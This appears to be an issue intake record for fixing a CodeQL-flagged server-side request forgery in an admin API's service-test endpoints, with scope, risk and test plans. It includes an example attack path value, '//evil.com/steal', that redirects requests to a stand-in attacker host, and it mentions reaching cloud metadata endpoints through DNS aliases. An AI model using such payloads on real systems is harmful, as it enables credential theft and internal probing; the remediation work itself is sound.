# Issue Intake — 2026-05-18-s1-codeql-ssrf

**Session:** `team/remediation/2026-05-18-s1-codeql-ssrf/`
**Branch:** `fix/s1-codeql-ssrf-2026-05-18` (from main @ `5203e23`)
**Reported:** 2026-05-18
**Reporter:** CodeQL scan — rule `py/full-ssrf` (Full server-side request forgery)
**Triggered by:** Automated CodeQL analysis flagging the outbound HTTP call in `admin-api/src/admin_api/api/services.py` at line 537.

## Problem statement (required)

`test_service_transient` (and, by analogy, `test_service`) constructs `final_url` by concatenating `base_url` (user-controlled in the transient endpoint, DB-stored in the service endpoint) with `test.path` (always user-controlled) and then passes it directly to `httpx.AsyncClient.request()`.

The existing `_is_forbidden_destination(base_url)` guard rejects RFC1918/loopback/link-local IP literals, but does NOT verify that the assembled `final_url` hostname stays on `base_url`'s hostname. Two attack vectors:

1. **Path-based host escape** (both endpoints): `test.path = //evil.com/steal` → after `base_url.rstrip('/') + path`, httpx may resolve the request against `evil.com`.
2. **Unconstrained base_url** (transient endpoint only): the caller supplies `base_url` itself; `_is_forbidden_destination` permits any DNS hostname (including `evil.com`, `internal.corp`, etc.) since DNS is not resolved at guard time.

CodeQL classifies this as Full SSRF because the HTTP target is derived from unsanitized user input with no effective hostname constraint.

## User-visible symptom (required)

An authenticated operator (or a compromised agent) can force the admin-api process to issue outbound HTTP requests to arbitrary internet hosts (or internal hosts not caught by the IP-literal blocklist), potentially:
- Leaking auth credentials to an attacker-controlled server.
- Probing internal infrastructure by supplying DNS names that resolve to private addresses (bypassing the IP-literal check).
- SSRF pivoting via cloud metadata endpoints using DNS aliases to 169.254.169.254.

## Expected behavior (required)

After `final_url` is assembled, the effective hostname parsed from `final_url` must equal (case-insensitive) the hostname parsed from `base_url`. On mismatch, the request must be rejected with HTTP 400 before the outbound call is made.

## Evidence (required)

- CodeQL alert: rule `py/full-ssrf`, file `admin-api/src/admin_api/api/services.py`, line 537 (the `httpx.AsyncClient.request(url=final_url, ...)` call inside `test_service_transient`).
- Code path: `body.service.base_url` (user input) → `final_url` (line 519 or earlier) → `client.request(url=final_url)` (line 537). No hostname validation between construction and use.
- Analogous path in `test_service` at line 694 (user-controlled `req.path` could still manipulate `final_url` hostname even though `base_url` is DB-sourced).

## Scope (required)

May be changed:
- `admin-api/src/admin_api/api/services.py` — add `_check_ssrf_hostname()` helper; call it in both `test_service_transient` and `test_service` after `final_url` is fully assembled.
- `admin-api/tests/test_ssrf_hostname_check.py` — new unit tests (negative + positive cases).
- `team/remediation/2026-05-18-s1-codeql-ssrf/ISSUE_INTAKE.md` — this file.
- `team/remediation/2026-05-18-s1-codeql-ssrf/99-report.md` — closing report.

## Out of scope (required)

- DNS-level SSRF (rebinding attacks, CNAME chains to private IPs). Mitigating those requires an egress proxy or DNS resolver integration — tracked separately.
- The `_is_forbidden_destination` blocklist itself — correct for IP literals; not replaced or removed.
- Any other endpoint or service. Only the two `test_service*` handlers are in scope.
- `00-plan.md`, `01-orchestrator-chunks.md`, `02-matrix.md`, `03-escalations.md`, `04-progress.md` — not required per session scaffold instructions.

## Risk level (required)

- **Security**: high positive — closes a confirmed Full-SSRF code path in the admin-api.
- **Behavior regression**: negligible — the guard triggers only on malformed `test.path` values or when `final_url` diverges from `base_url` host. Legitimate traffic (same hostname) is unaffected.
- **Performance**: zero — two `urlparse()` calls per test invocation.

## Verification target (required)

- `cd admin-api && python -m pytest tests/ -x -q` passes 8/8 tests (including 4 new negative + 4 new positive cases).
- `git diff --stat origin/main..HEAD` touches only owner files.
- Tests confirm: `169.254.169.254`, `localhost`, `internal.local`, and `evil.com` as `final_url` host all raise `HTTPException(400, mintkey:code=ssrf_blocked)` when `base_url` is `api.github.com`.
- Tests confirm: matching hostname (same, with path extension, case-insensitive, with query params) does not raise.

## Owner decisions

- ✅ **Guard placement**: after `final_url` is fully assembled (post all `api_key_query` mutations), before the `httpx` call.
- ✅ **Error shape**: `HTTPException(400, {"mintkey:code": "ssrf_blocked", "title": ..., "base_host": ..., "final_host": ...})` — matches structured-error pattern.
- ✅ **Case-insensitive comparison**: yes (RFC 4343).
- ✅ **Both endpoints patched**: `test_service_transient` (line 537) and `test_service` (line 694).

---

## Checklist

- [x] Problem statement
- [x] User-visible symptom
- [x] Expected behavior
- [x] Evidence (with file:line)
- [x] Scope
- [x] Out of scope
- [x] Risk level
- [x] Verification target
- [x] Owner decisions noted
